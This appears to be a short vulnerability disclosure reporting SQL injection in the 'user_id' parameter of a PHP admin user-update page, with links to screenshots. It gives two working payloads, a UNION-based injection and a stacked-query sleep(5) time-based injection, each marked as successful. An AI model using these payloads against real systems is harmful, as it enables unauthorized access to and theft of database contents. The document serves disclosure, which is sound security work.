BUG_Author:waibi8Bu

Vulnerability File: /reviewer/system/system/admins/manage/users/user-update.php

GET parameter 'user_id' exists SQL injection vulnerability

Payload1:user_id=2' union all select null,null,null,null,concat(0x353637,0x454647),null,null,null,null,null-- -

union query success

![image](https://github.com/rick13795/bug_report/blob/main/sql1.png)

Payload2:user_id=2';select sleep(5)-- -

Stacked queries succeeded, server response time is 5 seconds

![image](https://github.com/rick13795/bug_report/blob/main/sql2.png)
